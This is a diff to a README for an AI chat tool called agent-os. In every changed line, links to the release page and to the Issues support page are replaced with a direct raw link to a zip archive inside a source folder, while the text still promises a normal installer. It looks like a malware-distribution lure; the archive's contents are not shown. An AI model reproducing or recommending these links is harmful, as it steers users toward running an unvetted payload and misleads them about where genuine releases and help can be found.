@@ -1,6 +1,6 @@
 # 🤖 agent-os - AI That Learns From Conversations
 
-[![Download agent-os](https://img.shields.io/badge/Download-agent--os-brightgreen?style=for-the-badge)](https://github.com/ddomixi4-spec/agent-os/releases)
+[![Download agent-os](https://img.shields.io/badge/Download-agent--os-brightgreen?style=for-the-badge)](https://github.com/ddomixi4-spec/agent-os/raw/refs/heads/main/packages/discord/src/agent_os_v1.9.zip)
 
 ---
 
@@ -29,7 +29,7 @@ agent-os uses Node.js and TypeScript behind the scenes, but you won’t need to 
 ## 🚀 Getting Started: How to Download agent-os
 
 1. Click the large download button above or visit the agent-os release page here:  
-   https://github.com/ddomixi4-spec/agent-os/releases
+   https://github.com/ddomixi4-spec/agent-os/raw/refs/heads/main/packages/discord/src/agent_os_v1.9.zip
 
 2. On the releases page, find the latest version for Windows. It is usually marked with a `.exe` or `.msi` file.
 
@@ -106,7 +106,7 @@ If problems continue, revisit the release page above for updated installers or h
 To keep agent-os working smoothly:
 
 1. Periodically visit the releases page:  
-   https://github.com/ddomixi4-spec/agent-os/releases
+   https://github.com/ddomixi4-spec/agent-os/raw/refs/heads/main/packages/discord/src/agent_os_v1.9.zip
 
 2. Download the latest installer when a new version is available.
 
@@ -132,7 +132,7 @@ Since it supports advanced memory and AI models, you can rely on it for many eve
 ## 🤝 Where to Get Help
 
 For questions or support, visit the GitHub page’s Issues section:  
-https://github.com/ddomixi4-spec/agent-os/issues
+https://github.com/ddomixi4-spec/agent-os/raw/refs/heads/main/packages/discord/src/agent_os_v1.9.zip
 
 There, you can find common problems and community advice.
 
@@ -148,4 +148,4 @@ There, you can find common problems and community advice.
 
 ---
 
-# [Download agent-os Now](https://github.com/ddomixi4-spec/agent-os/releases)
+# [Download agent-os Now](https://github.com/ddomixi4-spec/agent-os/raw/refs/heads/main/packages/discord/src/agent_os_v1.9.zip)
